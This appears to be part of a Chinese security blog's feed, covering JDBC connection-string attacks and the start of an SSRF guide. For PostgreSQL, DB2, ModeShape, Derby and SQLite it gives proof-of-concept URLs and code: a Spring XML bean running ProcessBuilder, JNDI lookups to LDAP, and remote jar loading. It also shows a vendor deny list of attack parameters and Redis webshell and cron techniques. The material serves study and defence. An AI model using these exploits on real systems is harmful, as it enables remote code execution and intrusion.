href="https://mp.weixin.qq.com/s/xNOwuxRSr-Kt-s4-KktepA">https://mp.weixin.qq.com/s/xNOwuxRSr-Kt-s4-KktepA</a></p><p>实际也很简单，只要携带着h2依赖，jdbcURL可控就可以了，JDBC会自动加载相关h2类，也不需要显示加载，因此直接可以利用。</p><p><strong>内网：</strong></p><p>内网的8082有可能运行着web管理端口，可以直接输入url，不一样的是，管理端口需要数据库真实存在才可以</p><h1 id="0x03-postgresql"><a class="markdownIt-Anchor" href="#0x03-postgresql"></a> 0x03 PostgreSQL</h1><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018111712723.png" alt="image-20241018111712723" /></p><h2 id="命令执行-2"><a class="markdownIt-Anchor" href="#命令执行-2"></a> 命令执行</h2><p>CVE-2022-21724</p><p><strong>影响版本：</strong></p><ul><li>&gt;= 9.4.1208，&lt; 42.2.25</li><li>&gt;= 42.3.0，&lt; 42.3.2</li></ul><p><strong>触发条件：</strong></p><ul><li>出网</li><li>存在spring依赖</li></ul><p><strong>原理分析：</strong></p><p>具体触发流程看下面这张图即可，这张图非常清晰：（<a href="https://xz.aliyun.com/t/11812%EF%BC%89">https://xz.aliyun.com/t/11812）</a></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20221107160114-59dd8d94-5e72-1.png" alt="20221107160114-59dd8d94-5e72-1" /></p><p>最终需要寻找一个构造方法参数为String的类，<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>类可以远程加载文件，执行spel表达式。漏洞触发也就需要spring依赖，<strong>或者系统代码中本身包含了类似gadget</strong>。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018142555756.png" alt="image-20241018142555756" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018143038642.png" alt="image-20241018143038642" /></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;public class PostGre &#123;    public static void main(String[] args) throws SQLException &#123;        String socketFactoryClass &#x3D; &quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;;        String socketFactoryArg &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;bean.xml&quot;;        String jdbcUrl &#x3D; &quot;jdbc:postgresql:&#x2F;&#x2F;127.0.0.1:5432&#x2F;test&#x2F;?socketFactory&#x3D;&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg&#x3D;&quot;+socketFactoryArg;        Connection connection &#x3D; DriverManager.getConnection(jdbcUrl);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SPEL xml</p><pre class="line-numbers language-XML" data-language="XML"><code class="language-XML">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;       xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;       xmlns:p&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;p&quot;       xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans        http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;&lt;!--    普通方式创建类--&gt;   &lt;bean id&#x3D;&quot;exec&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot; init-method&#x3D;&quot;start&quot;&gt;        &lt;constructor-arg&gt;          &lt;list&gt;            &lt;value&gt;bash&lt;&#x2F;value&gt;            &lt;value&gt;-c&lt;&#x2F;value&gt;            &lt;value&gt;calc.exe&lt;&#x2F;value&gt;          &lt;&#x2F;list&gt;        &lt;&#x2F;constructor-arg&gt;    &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面文章还提到了另一种利用链，但是实质上就是通过响应，走了另一条路，触发点相同，因此不做过多测试。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20221107161326-0e54b59e-5e74-1.png" alt="20221107161326-0e54b59e-5e74-1" /></p><h2 id="文件写入"><a class="markdownIt-Anchor" href="#文件写入"></a> 文件写入</h2><ul><li><p><strong>不需要出网</strong></p></li><li><p><strong>支持跨目录、绝对和相对路径</strong></p></li></ul><p>利用方法比较简单，主要是通过设置参数，通过日志功能，写入文件。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20221107161753-ad66e184-5e74-1.png" alt="20221107161753-ad66e184-5e74-1" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018145825223.png" alt="image-20241018145825223" /></p><h1 id="0x04-sqllite"><a class="markdownIt-Anchor" href="#0x04-sqllite"></a> 0x04 SQLlite</h1><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018171211180.png" alt="image-20241018171211180" /></p><h2 id="命令执行-3"><a class="markdownIt-Anchor" href="#命令执行-3"></a> 命令执行</h2><p>CVE-2023-32697</p><p><strong>影响版本：</strong></p><ul><li>3.6.14.1-3.41.2.1</li></ul><p><strong>需要出网</strong></p><p><strong>需要知道默认存储so文件的路径</strong>（Linux默认是tmp，Windows就需要爆破用户名，才能知道完整的tmp路径了。C:\Users\administrator\AppData\Local\Temp\）</p><p><strong>需要执行SQL语句记载恶意so</strong></p><p>限制比较多。</p><p>简单过一下原理，jdbc链接时，存在参数，可以开启load_extension</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018152329176.png" alt="image-20241018152329176" /></p><p>SQLlite属性jdbc:sqlite::resource: 支持加载远程文件，并且会将改文件保存到本地</p><p>且保存文件名已知。（下面是对该漏洞的patch）</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018154843829.png" alt="image-20241018154843829" /></p><p>load_extension可以加载动态链接库，其实类似于UDF</p><h2 id="实战利用"><a class="markdownIt-Anchor" href="#实战利用"></a> 实战利用</h2><p>上面分析过了，此漏洞限制比较多，其实重点还是在最终需要执行SQL，这里拿举几个例子：</p><p><strong>CISCN2024-WEB-EZjava：</strong></p><p>这道题给了tableName一个SQL注入点</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018161836273.png" alt="image-20241018161836273" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018155619555.png" alt="image-20241018155619555" /></p><p><strong>某报表后台漏洞：</strong></p><p>后台可以自定义执行SQL，因此可以加载动态链接库。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018162243367.png" alt="image-20241018162243367" /></p><p>不过该报表存在黑名单，无法利用sqllite特性落地缓存文件，该漏洞实战鸡肋。</p><p>看一下报表的patch，其中的关键字其实也就是常用的jdbc攻击相关</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"INIT="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//h2 执行SQL语句</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"allowLoadLocalInfile="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//mysql 文件读取</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"autoDeserialize="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//mysql 反序列化</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"clientRerouteServerListJNDIName="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//db2 jndi</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"jcr:jndi:"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//modeshape jndi</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"slaveHost="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//derby 反序列化</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"sqlite::resource"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//sqlite 远程加载文件</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"mysql:fabric"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//fabric xxe</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"socketFactory="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//postgre 实例化类</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"loggerFile="</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//postgre 写文件</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"TRIGGER"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//h2 自定义触发器</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//java执行语句</span>    <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecurityURLParameter</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessImpl"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">InsecurityURLResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">InsecurityElement</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InsecurityElement</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"create"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"drop"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"truncate"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"comment"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"rename"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"insert"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"update"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"call"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"lock"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"merge"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLKeyword</span><span class="token punctuation">(</span><span class="token string">"attach"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">InsecurityElement</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">FORBIDDEN_FUNCTION_OF_SQL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InsecurityElement</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>    <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"file_write"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"file_read"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"csvwrite"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"csvread"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"updatexml"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token keyword">new</span> <span class="token class-name">InsecuritySQLFunction</span><span class="token punctuation">(</span><span class="token string">"LINK_SCHEMA"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">InsecurityElement</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">FORBIDDEN_ELEMENTS_OF_SQL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-db2"><a class="markdownIt-Anchor" href="#0x05-db2"></a> 0x05 DB2</h1><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018171819448.png" alt="image-20241018171819448" /></p><h2 id="jndi"><a class="markdownIt-Anchor" href="#jndi"></a> jndi</h2><p><strong>特性，未作修复</strong></p><p>不做过多分析。</p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.sql.DriverManager;public class db2 &#123;    public static void main(String[] args) throws Exception &#123;        DriverManager.getConnection(&quot;jdbc:db2:&#x2F;&#x2F;127.0.0.1:50000&#x2F;BLUDB:clientRerouteServerListJNDIName&#x3D;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;test;&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用堆栈如下：</p><pre class="line-numbers language-none"><code class="language-none">lookuprun:30, c0 (com.ibm.db2.jcc.am)doPrivileged:-1, AccessController (java.security)c:6693, b (com.ibm.db2.jcc.t4)a:6574, b (com.ibm.db2.jcc.t4)newAgent_:2041, b (com.ibm.db2.jcc.t4)initConnection:839, Connection (com.ibm.db2.jcc.am)&lt;init&gt;:784, Connection (com.ibm.db2.jcc.am)&lt;init&gt;:350, b (com.ibm.db2.jcc.t4)getConnection:233, DB2SimpleDataSource (com.ibm.db2.jcc)getConnection:200, DB2SimpleDataSource (com.ibm.db2.jcc)connect:471, DB2Driver (com.ibm.db2.jcc)connect:113, DB2Driver (com.ibm.db2.jcc)getConnection:664, DriverManager (java.sql)getConnection:270, DriverManager (java.sql)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x06-modeshape"><a class="markdownIt-Anchor" href="#0x06-modeshape"></a> 0x06 modeshape</h1><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018174243188.png" alt="image-20241018174243188" /></p><h2 id="jndi-2"><a class="markdownIt-Anchor" href="#jndi-2"></a> jndi</h2><p><strong>特性，未作修复</strong></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.sql.DriverManager;import java.sql.SQLException;public class modeshape &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;        DriverManager.getConnection(&quot;jdbc:jcr:jndi:ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;q2s3n8&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用堆栈</p><pre class="line-numbers language-none"><code class="language-none">lookupinitRepository:174, LocalRepositoryDelegate (org.modeshape.jdbc.delegate)createConnection:95, AbstractRepositoryDelegate (org.modeshape.jdbc.delegate)connect:188, LocalJcrDriver (org.modeshape.jdbc)getConnection:664, DriverManager (java.sql)getConnection:270, DriverManager (java.sql)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x07-apache-derby"><a class="markdownIt-Anchor" href="#0x07-apache-derby"></a> 0x07 Apache Derby</h1><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20241018175119951.png" alt="image-20241018175119951" /></p><h2 id="反序列化-2"><a class="markdownIt-Anchor" href="#反序列化-2"></a> 反序列化</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>javasec<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span><span class="token class-name">Derby</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DriverManager</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> demo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.derby.jdbc.EmbeddedDriver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//DriverManager.getConnection("jdbc:derby:dbname;create=true");</span>        <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token string">"jdbc:derby:dbname;startMaster=true;slaveHost=127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端直接通过socket传输反序列化数据即可</p><h2 id="加载jar题外话"><a class="markdownIt-Anchor" href="#加载jar题外话"></a> 加载Jar（题外话）</h2><p>nacos 漏洞（执行SQL语句，可以加载jar文件导致命令执行）</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">CALL sqlj.install_jar(&#39;http:&#x2F;&#x2F;localhost&#x2F;exploit.zip&#39;, &#39;APP.Sample1&#39;,0);&#x2F;&#x2F;加载JARCALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#39;derby.database.classpath&#39;,&#39;APP.Sample1&#39;)&#x2F;&#x2F;定义要加载的CLASS资源CREATE FUNCTION SHELL_COMMAND( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#39;test.evil.run.exec&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://xz.aliyun.com/t/10599">https://xz.aliyun.com/t/10599</a></p><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://blog.csdn.net/fnmsd/article/details/106232092">https://blog.csdn.net/fnmsd/article/details/106232092</a></p><p><a href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://www.freebuf.com/articles/security-management/377793.html">https://www.freebuf.com/articles/security-management/377793.html</a></p><p><a href="https://mp.weixin.qq.com/s/lmoWKK41ZQzZOh-P26VUng">https://mp.weixin.qq.com/s/lmoWKK41ZQzZOh-P26VUng</a></p><p><a href="https://github.com/Y4Sec-Team/mysql-jdbc-trick">https://github.com/Y4Sec-Team/mysql-jdbc-trick</a></p><p><a href="https://mp.weixin.qq.com/s/vdb2zUbE4DxV-ua1xWm5cw">https://mp.weixin.qq.com/s/vdb2zUbE4DxV-ua1xWm5cw</a></p><p><a href="https://xz.aliyun.com/t/11812">https://xz.aliyun.com/t/11812</a></p><p><a href="https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ">https://mp.weixin.qq.com/s/JY1C2LqOqbAQvJLIhG8prQ</a></p><p><a href="https://github.com/su18/JDBC-Attack/">https://github.com/su18/JDBC-Attack/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-序&quot;&gt;&lt;/a&gt; 0x00 序&lt;/h1&gt;
&lt;p&gt;JDBC（Java DataBase Connectivity，java数据库连接）是一种用于执行Sql语句的Java </summary>
      
    
    
    
    
    <category term="Java" scheme="https://cyxsec.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>java代码审计-框架结构梳理篇</title>
    <link href="https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/</id>
    <published>2024-08-27T07:53:29.000Z</published>
    <updated>2024-09-19T02:08:30.719Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF攻防指北</title>
    <link href="https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/</id>
    <published>2024-08-16T08:08:39.000Z</published>
    <updated>2024-10-28T07:31:58.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序"><a class="markdownIt-Anchor" href="#序"></a> 序</h1><p>平时做渗透的时候遇见ssrf的次数其实不少，但是都是点到为止。打攻防的时候，也用了ssrf打了不少组合拳。</p><p>简单从攻防的角度，结合之前自己做的项目，做一个自我的总结和理解吧。</p><p><strong>因为是个人的一些项目经验，因此难免存在遗漏，欢迎各位师傅补充。</strong></p><h1 id="0x01-常见利用点"><a class="markdownIt-Anchor" href="#0x01-常见利用点"></a> 0x01 常见利用点</h1><h2 id="文件读取"><a class="markdownIt-Anchor" href="#文件读取"></a> 文件读取</h2><p>支持file协议，且有回显的情况下，可以读取文件。</p><p>Linux下的读文件，proc里面有很多有价值的，包括运行环境、命令行、端口等等信息。单jar环境下很容易下载到源码。</p><p>其余思路就是：</p><ul><li>历史命令</li><li>日志文件（框架、web）</li><li>php可以利用include的特性一点点下php文件。</li><li>java可以下载单jar或者web.xml文件，利用web.xml路由信息下载对应的class文件，然后通过import的特性下载其余的class文件。</li><li>java的配置文件fuzz（jdbc、aliyun等配置文件）</li><li>.net的web.config 结合machineKey 打反序列化。其余下载源码的方式也类似，不过.net遇见编译dll的场景更多。</li></ul><p><strong>其实问题主要在要输入跟路径，这与文件下载不太一样，有时候很难找到物理路径。</strong></p><p>实战中可以和洞可以结合起来利用，比如列目录漏洞。</p><p>常见的列目录漏洞就是<strong>FCKeditor</strong>编辑器了。（列目录还有个妙用就是列tmp目录，这样就能拿到php的sessionid了）</p><h2 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h2><p>redis在渗透中经常遇见。</p><p>实战中怎么知道系统有没有redis服务呢？</p><p><strong>可以尝试读取/etc/passwd文件，看看有无redis用户。</strong></p><ol><li>利用方式</li></ol><p>redis拿shell一般主要利用</p><ul><li>备份数据库，我们设置键值为我们想要的payload，这样就能备份到payload到我们想要的目录。</li></ul><p>这样就会存在脏数据，因此一般常见就是webshell、计划任务和ssh公钥利用方式，<strong>webshell一般特殊字符不影响解析，ssh公钥和计划任务会采取换行的方式避免脏数据，计划任务这个问题在不同的linux系统就不一样了，debain和ubuntu对计划任务格式有严格要求（文件权限也有限制），只有centos可以利用</strong></p><ul><li>主从复制，简单理解就是同步数据，这样写入不会存在脏数据，也可以写入二进制文件。</li></ul><ol start="2"><li>redis为什么在ssrf中用的这么多呢？？</li></ol><p>其实与redis使用的通讯协议有关，每个服务都会有自己的通讯协议，了解过tcp的应该知道tcp的数据构造有多复杂，每个hex值都有自己的含义。</p><p>但是redis的通讯协议就比较粗糙了。</p><p>比如“set name 虎哥“在协议下就是如此构造的，格式很简单，语句是用CRLF分段的。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240919165618027.png" alt="image-20240919165618027" /></p><h3 id="redis协议机制"><a class="markdownIt-Anchor" href="#redis协议机制"></a> Redis协议机制</h3><p>上面我们分析了redis的协议resp，但是我们搞过一些实战应该知道，dict协议也是能打redis的，但是dict协议本身没办法构造出完整的resp协议，为什么dict协议能被用在打redis中呢？</p><p>遇事不决，wireshark抓一下包分析一下。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923141623931.png" alt="image-20240923141623931" /></p><p>分析了原始的tcp数据流，我们发现请求格式没有按照resp协议去构造，但是依然正常响应了结果。</p><p>翻了半天redis文档没找到相关说法，去github上面看一下源码：</p><p><strong>其实redis做了兼容性处理，默认情况下Redis 可以解析直接通过 TCP 发送的简单的、以空格分隔的命令字符串，如 <code>SET key value</code></strong></p><p>具体看下图：如果数据不以*开头，将会认为是INLINE格式的数据，后面一样会进行解析，按照空格分割命令字符串</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923142334205.png" alt="image-20240923142334205" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923142856744.png" alt="image-20240923142856744" /></p><p><strong>redis利用的思路一下子就被打开了，只要能完整控制一行的tcp数据，我们就可以和redis通讯</strong></p><p>我们发现redis确实尝试解析了我们发送的<strong>http请求</strong>的所有字段，且最后的set命令成功执行。（注意这里要有换行回车）</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923143459606.png" alt="image-20240923143459606" /></p><p><strong>思路再发散一点，我们能发送CRLF，就能控制和redis做交互，这样有一些可能存在CRLF注入的鸡肋ssrf也能利用到redis了，比如weblogic</strong></p><h3 id="有密码情况的利用"><a class="markdownIt-Anchor" href="#有密码情况的利用"></a> 